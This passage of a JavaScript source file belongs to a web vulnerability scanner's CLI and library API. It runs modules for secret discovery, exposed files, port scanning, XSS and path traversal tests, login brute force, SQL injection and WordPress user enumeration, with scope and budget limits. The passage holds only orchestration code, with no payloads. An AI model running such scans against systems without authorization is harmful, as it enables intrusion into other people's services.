  console.log(chalk.bold('━'.repeat(60)) + '\n');

  // Proposer d'exporter en HTML si c'est un JSON
  const { postAction } = await inquirer.prompt([
    {
      type: 'list',
      name: 'postAction',
      message: 'Action:',
      choices: [
        { name: 'Retour au menu', value: 'back' },
        { name: 'Exporter ce scan en HTML', value: 'html' },
        { name: 'Supprimer ce scan', value: 'delete' },
      ],
    },
  ]);

  if (postAction === 'html') {
    // Injecter les findings du scan charge pour l'export
    findings.length = 0;
    findings.push(...scan.data.findings);
    await exportHtml(scan.data.url);
  } else if (postAction === 'delete') {
    const { confirmDelete } = await inquirer.prompt([
      { type: 'confirm', name: 'confirmDelete', message: `Supprimer ${scan.file}?`, default: false },
    ]);
    if (confirmDelete) {
      fs.unlinkSync(path.default.join(dir, scan.file));
      console.log(chalk.green(`  Scan supprime.\n`));
    }
  }

  if (postAction === 'back') {
    await viewHistory();
  }
}

// ──────────── LIBRARY API ────────────

function silentSpinner() {
  return {
    text: '',
    succeed() {},
    fail() {},
    warn() {},
    info() {},
    start() { return this; },
    stop() {},
  };
}

function emitScanProgress(onProgress, event) {
  if (typeof onProgress !== 'function') return;
  try {
    onProgress(event);
  } catch {}
}

function progressSpinner(module, onProgress) {
  let message = '';
  return {
    get text() { return message; },
    set text(value) {
      message = String(value || '');
      emitScanProgress(onProgress, { stage: 'progress', module, message });
    },
    succeed(value) {
      emitScanProgress(onProgress, { stage: 'complete', module, message: String(value || message) });
    },
    fail(value) {
      emitScanProgress(onProgress, { stage: 'error', module, message: String(value || message) });
    },
    warn(value) {
      emitScanProgress(onProgress, { stage: 'warning', module, message: String(value || message) });
    },
    info(value) {
      emitScanProgress(onProgress, { stage: 'progress', module, message: String(value || message) });
    },
    start() { return this; },
    stop() {},
  };
}

function normalizeScanUrl(url) {
  const parsed = new URL(url.includes('://') ? url : `https://${url}`);
  parsed.hash = '';
  return parsed.toString().replace(/\/+$/, '');
}

async function runStep(name, fn, errors, metrics, signal, onProgress) {
  if (signal?.aborted) throw signal.reason || new Error('scan_cancelled');
  const spinner = progressSpinner(name, onProgress);
  emitScanProgress(onProgress, { stage: 'start', module: name, message: `Running ${name}...` });
  try {
    const result = await metrics.run(name, () => fn(typeof onProgress === 'function' ? spinner : silentSpinner()));
    if (signal?.aborted) throw signal.reason || new Error('scan_cancelled');
    emitScanProgress(onProgress, { stage: 'complete', module: name, message: `${name} complete` });
    return result;
  } catch (err) {
    if (signal?.aborted) throw signal.reason || err;
    const message = err instanceof Error ? err.message : String(err);
    errors.push({ module: name, message });
    emitScanProgress(onProgress, { stage: 'error', module: name, message });
  }
}

/**
 * Worker-friendly scan API.
 *
 * This does not prompt, print reports, or write local scan artifacts. It reuses
 * the CLI modules and returns serializable JSON for platform workers.
 */
async function runScanInternal(config, httpClient, context) {
  if (!config.url) throw new Error('runScan requires a url');

  const modules = config.modules?.length ? config.modules : DEFAULT_LIBRARY_MODULES;
  const baseUrl = normalizeScanUrl(config.url);
  const errors = [];
  const metrics = createScanMetrics({ getFindingCount: () => context.findings.length });
  const executeStep = (name, fn) => runStep(name, fn, errors, metrics, context.signal, config.onProgress);
  let jsContents = [];
  let supabaseAudit = null;
  let aiRagAudit = null;
  const supabaseCreds = config.supabaseUrl
    ? { url: config.supabaseUrl, key: config.supabaseKey || null }
    : null;

  if (modules.includes('js') || modules.includes('supabase') || modules.includes('authinjection') || modules.includes('api') || modules.includes('storage') || modules.includes('websocket')) {
    await executeStep('crawl', async (spinner) => {
      const result = await crawlAndExtract(baseUrl, spinner, { reportFindings: modules.includes('js') });
      jsContents = result.scripts;
    });
  }

  if (modules.includes('js') && jsContents.length > 0) {
    await executeStep('js', (spinner) => analyzeScripts(jsContents, spinner));
  }

  if (modules.includes('files')) {
    await executeStep('files', (spinner) => checkSensitivePaths(baseUrl, spinner));
  }

  if (modules.includes('headers')) {
    await executeStep('headers', (spinner) => checkHeaders(baseUrl, spinner));
  }

  if (modules.includes('ai-rag')) {
    aiRagAudit = await executeStep('ai-rag', async (spinner) => {
      const result = await auditAiRag(baseUrl, config.aiRag, {
        fetch: safeFetch,
        onPhase: (phase) => {
          spinner.text = `Testing AI/RAG ${phase}`;
          emitScanProgress(config.onProgress, {
            stage: 'progress',
            module: `ai-rag-${phase}`,
            message: `Testing AI/RAG ${phase}`,
          });
        },
      });
      for (const finding of result.findings) {
        addFinding(
          finding.severity,
          finding.module,
          finding.title,
          finding.detail,
          finding.recommendation,
          {
            rule_id: finding.rule_id,
            classification: finding.classification,
            confidence: finding.confidence,
            evidence: finding.evidence,
            standards: finding.standards,
          },
        );
      }
      return result.audit;
    });
  }

  // Run when the module is selected AND we either crawled scripts or were handed
  // explicit credentials (supabase-deep passes creds without a crawl).
  if (modules.includes('supabase') && (jsContents.length > 0 || supabaseCreds)) {
    supabaseAudit = await executeStep('supabase', (spinner) => auditSupabase(jsContents, spinner, supabaseCreds));
  }

  if (modules.includes('authinjection') && jsContents.length > 0) {
    await executeStep('authinjection', (spinner) => auditAuthInjection(jsContents, spinner));
  }

  if (modules.includes('vps')) {
    await executeStep('vps', (spinner) => auditVps(spinner));
  }

  if (modules.includes('attacks')) {
    await executeStep('attacks', (spinner) => auditAttackScenarios(baseUrl, jsContents, spinner));
  }

  if (modules.includes('login')) {
    await executeStep('login', (spinner) => auditLoginSecurity(baseUrl, spinner));
  }

  if (modules.includes('subdomains')) {
    await executeStep('subdomains', (spinner) => scanSubdomains(baseUrl, spinner));
  }

  if (modules.includes('dns')) {
    await executeStep('dns', (spinner) => auditDns(baseUrl, spinner));
  }

  if (modules.includes('api') && jsContents.length > 0) {
    await executeStep('api', (spinner) => auditApiEndpoints(baseUrl, jsContents, spinner));
  }

  if (modules.includes('storage') && jsContents.length > 0) {
    await executeStep('storage', (spinner) => auditStorage(jsContents, spinner));
  }

  if (modules.includes('websocket') && jsContents.length > 0) {
    await executeStep('websocket', (spinner) => auditWebsockets(baseUrl, jsContents, spinner));
  }

  if (modules.includes('wordpress')) {
    await executeStep('wordpress', (spinner) => auditWordPress(baseUrl, jsContents, spinner));
  }

  if (modules.includes('tls')) {
    await executeStep('tls', (spinner) => auditTls(baseUrl, spinner));
  }

  if (modules.includes('stack')) {
    await executeStep('stack', (spinner) => detectStack(baseUrl, jsContents, spinner));
  }

  const score = calculateScanScore(context.findings);
  const scanMetrics = metrics.finish();
  scanMetrics.network = httpClient.metrics();
  scanMetrics.browser = { ...context.browserMetrics };
  scanMetrics.scope = context.scope.metrics();
  const limitations = [];
  if (scanMetrics.network.budget_exhausted) limitations.push('network_budget_exhausted');
  if (scanMetrics.scope.budget_exhausted) limitations.push('dns_budget_exhausted');
  if (modules.includes('supabase') && supabaseAudit?.inventoryComplete === false) limitations.push('supabase_schema_inventory_unavailable');
  if (modules.includes('ai-rag') && aiRagAudit?.limitations?.length) limitations.push(...aiRagAudit.limitations);
  const coverage = summarizeCoverage(modules, scanMetrics.steps, { limitations });
  const supabaseOnly = modules.length === 1 && modules[0] === 'supabase';
  const aiRagOnly = modules.length === 1 && modules[0] === 'ai-rag';
  const scoreAvailable = (!supabaseOnly || supabaseAudit?.scoreAvailable === true)
    && (!aiRagOnly || aiRagAudit?.scoreAvailable === true);
  return {
    target: baseUrl,
    score: scoreAvailable ? score.score : null,
    grade: scoreAvailable ? score.grade : null,
    scoring_version: SCORING_VERSION,
    findings: [...context.findings],
    errors,
    modules,
    metrics: scanMetrics,
    coverage,
    score_reliable: coverage.status === 'complete',
    engine_version: ENGINE_VERSION,
    ruleset_version: RULESET_VERSION,
    score_breakdown: {
      total_penalty: score.total_penalty,
      breakdown: score.breakdown,
      excluded: score.excluded,
      min_confidence: score.min_confidence,
    },
    completed_at: new Date().toISOString(),
    ai_rag_audit: aiRagAudit,
  };
}

async function runScan(config = {}) {
  if (!config.url) throw new Error('runScan requires a url');
  const baseUrl = normalizeScanUrl(config.url);
  const modules = config.modules?.length ? config.modules : DEFAULT_LIBRARY_MODULES;
  if (modules.some((module) => !AVAILABLE_MODULES.includes(module))) {
    throw new Error('invalid_scan_module');
  }
  const allowedHosts = new Set(config.allowedHosts || []);
  if (config.supabaseUrl) {
    try { allowedHosts.add(new URL(config.supabaseUrl).hostname); } catch {}
  }
  const trustedHosts = new Set(config.trustedHosts || []);
  if (modules.includes('subdomains')) trustedHosts.add('crt.sh');
  const allowedPorts = new Set((config.allowedPorts || []).map(String));
  if (modules.includes('vps')) {
    for (const { port } of COMMON_PORTS) allowedPorts.add(String(port));
  }
  const scope = createScopePolicy(baseUrl, {
    allowedHosts: [...allowedHosts],
    trustedHosts: [...trustedHosts],
    allowedPorts: allowedPorts.size > 0 ? [...allowedPorts] : undefined,
    includeSubdomains: config.includeSubdomains !== false,
    allowPrivateTargets: config.allowPrivateTargets === true,
    resolver: config.scopeResolver,
    maxDnsResolutions: config.maxDnsResolutions,
    maxDnsAnswers: config.maxDnsAnswers,
  });
  await scope.assertUrl(baseUrl);
  const authContext = config.authCookie || config.authHeader
    ? parseAuthString(config.authCookie, config.authHeader)
    : null;
  const context = createScanContext({ authContext, signal: config.signal || null, scope });
  const httpClient = createHttpClient({
    timeoutMs: config.requestTimeoutMs,
    maxResponseBytes: config.maxResponseBytes,
    maxCacheEntries: config.maxCacheEntries,
    maxRedirects: config.maxRedirects,
    maxNetworkRequests: config.maxNetworkRequests,
    maxTotalResponseBytes: config.maxTotalResponseBytes,
    signal: config.signal || null,
    scope,
  });
  return withScanContext(context, () => withHttpClient(httpClient, async () => {
    try {
      return await runScanInternal(config, httpClient, context);
    } finally {
      await Promise.all([...context.browsers].map(browser => browser.close().catch(() => {})));
      context.browsers.clear();
    }
  }));
}

// ──────────── MAIN ────────────

async function main(options = {}) {
  // Configure authenticated crawl from caller-supplied options (CLI flags)
  if (options.authCookie || options.authHeader) {
    AUTH_CONTEXT = parseAuthString(options.authCookie, options.authHeader);
    if (AUTH_CONTEXT) {
      const cookieCount = AUTH_CONTEXT.cookies.length;
      const headerCount = Object.keys(AUTH_CONTEXT.headers).length;
      console.log(chalk.gray(`  Auth context loaded: ${cookieCount} cookie(s), ${headerCount} header(s) - applied to crawl pages.\n`));
    }
  }

  let url = options.url;
  if (!url) {
    const answer = await inquirer.prompt([
      {
        type: 'input',
        name: 'url',
        message: chalk.bold('Target URL to scan:'),
        validate: (input) => {
          try { new URL(input); return true; } catch { return 'Enter a valid URL (e.g. https://example.com)'; }
        },
      },
    ]);
    url = answer.url;
  }

  let modules = options.modules;
  if (!modules) {
    ({ modules } = await inquirer.prompt([
      {
        type: 'checkbox',
        name: 'modules',
        message: chalk.bold('Modules to run:'),
        choices: [
          { name: 'Crawl & JS Analysis (secrets, IPs, API keys)', value: 'js', checked: true },
          { name: 'Exposed sensitive files (.env, .git, etc.)', value: 'files', checked: true },
          { name: 'HTTP security headers', value: 'headers', checked: true },
          { name: 'Supabase audit (RLS, tables, auth)', value: 'supabase', checked: true },
          { name: 'Auth Injection (signup, auth.users, admin endpoints)', value: 'authinjection', checked: true },
          { name: 'VPS audit (port scan, services, banners, proxy bypass)', value: 'vps', checked: true },
          { name: 'Attack tests (XSS, Clickjacking, CORS, Open Redirect, Path Traversal)', value: 'attacks', checked: true },
          { name: 'Login audit (brute force, CSRF, SQL injection, enumeration, CSP bypass)', value: 'login', checked: true },
          { name: 'Stack detection (frameworks, servers, services, versions)', value: 'stack', checked: true },
          { name: 'Subdomain scanning', value: 'subdomains', checked: true },
          { name: 'DNS & Email security (SPF, DKIM, DMARC)', value: 'dns', checked: true },
          { name: 'API endpoint audit', value: 'api', checked: true },
          { name: 'Storage / Buckets (Supabase Storage, S3, GCS)', value: 'storage', checked: true },
          { name: 'WebSocket / Realtime (eavesdropping without auth)', value: 'websocket', checked: true },
          { name: 'TLS deeper analysis (cert, version, ciphers)', value: 'tls', checked: true },
          { name: 'WordPress specifics (user enum, xmlrpc, REST users)', value: 'wordpress', checked: true },
          { name: 'AI/RAG application security (API, prompts, retrieval, tools)', value: 'ai-rag', checked: false },
        ],
      },
    ]));
  }

  let aiRag = options.aiRag;
  if (modules.includes('ai-rag') && !aiRag) {
    const { aiRagConfigPath } = await inquirer.prompt([{
      type: 'input',
      name: 'aiRagConfigPath',
      message: chalk.bold('AI/RAG configuration file:'),
      default: 'vice.ai-rag.json',
      validate: (input) => {
        try {
          const stat = fs.statSync(path.resolve(input));
          return stat.isFile() ? true : 'Enter a valid configuration file path';
        } catch {
          return 'Enter a valid configuration file path';
        }
      },
    }]);
    aiRag = loadAiRagCliConfig(aiRagConfigPath);
  }

  const baseUrl = url.replace(/\/+$/, '');
  console.log('');

  const scanSpinner = ora({ text: 'Starting scan...', color: 'magenta' }).start();
  let result;
  try {
    result = await runScan({
      url: baseUrl,
      modules,
      authCookie: options.authCookie,
      authHeader: options.authHeader,
      aiRag,
      onProgress: ({ stage, module, message }) => {
        if (stage === 'start') scanSpinner.text = `Running ${module}...`;
        else if (message) scanSpinner.text = message;
      },
    });
    if (result.errors.length > 0) {
      scanSpinner.warn(`Scan completed with ${result.errors.length} module error(s)`);
    } else {
      scanSpinner.succeed('Scan complete');
    }
  } catch (error) {
    scanSpinner.fail('Scan failed');
    throw error;
  }
  findings.length = 0;
  findings.push(...result.findings);
  // REPORT
  printReport();
  if (!result.score_reliable) {
    console.log(chalk.yellow('  Score provisional: some checks were incomplete. See coverage in the JSON report.\n'));
  }

  // Auto-save JSON to scans/
  await exportJson(baseUrl, result);

  // Optional HTML export
  const { wantHtml } = options.nonInteractive
    ? { wantHtml: false }
    : await inquirer.prompt([
        {
          type: 'confirm',
          name: 'wantHtml',
          message: 'Also export as HTML (visual report)?',
          default: false,
        },
      ]);

  if (wantHtml) {
    await exportHtml(baseUrl);
  }

  console.log(chalk.hex('#6366f1')('  Webba Creative Technologies') + chalk.gray(' - Scan complete.\n'));
}

export { main, runScan, ALL_MODULES, AVAILABLE_MODULES, PASSIVE_MODULES, SPECIALIZED_MODULES };

// Run directly if this file is the entry point
const isDirectRun = process.argv[1] && (
  process.argv[1].endsWith('scan.js') ||
  process.argv[1].replace(/\\/g, '/').endsWith('scan.js')
);
if (isDirectRun) main().catch(console.error);
